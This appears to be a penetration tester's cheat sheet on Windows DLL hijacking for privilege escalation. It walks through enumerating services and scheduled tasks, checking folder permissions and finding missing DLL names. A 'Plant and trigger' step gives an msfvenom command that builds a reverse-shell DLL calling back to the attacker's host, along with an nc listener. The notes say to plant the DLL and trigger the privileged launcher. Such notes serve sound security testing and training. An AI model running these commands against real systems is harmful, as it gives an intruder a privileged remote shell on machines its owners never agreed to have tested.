# DLL hijacking checks

Needs: privileged launcher + exact DLL request + writable location in its real search order + trigger.
- Match architecture; KnownDLLs and already-loaded modules change the search order.

## Find a candidate
```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name,State,StartName,PathName
Get-ScheduledTask | Select-Object TaskName,Actions,Principal
icacls 'C:\Path\To\Application'
```
Known service/task when broad enumeration is blocked:
```powershell
sc.exe qc <SERVICE>
schtasks.exe /query /tn '<TASK>' /fo LIST /v
```
On Kali, on a copy of the exe (UTF-16LE: plain `strings` misses Windows `LoadLibrary` names):
```bash
strings -a -e l scheduler.exe | rg -i '\.dll'
```
```powershell
.\Find-ExecutableReferences.ps1 'C:\Path\To\application.exe'
```
- String hits are candidates only. Procmon: filter `CreateFile` by process + `NAME NOT FOUND` DLL path; confirm the writable directory is searched first.
- Script: [Find-ExecutableReferences.ps1](../scripts/Find-ExecutableReferences.ps1).

## Plant and trigger
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=<PORT> \
  -f dll -o <MISSING-DLL-NAME>.dll
nc -lvnp <PORT>
```
- Exact DLL name, matching architecture. Copy it to the confirmed path, trigger the launcher, check `whoami`.
- Keep the original file if one existed; remove your test DLL afterwards.
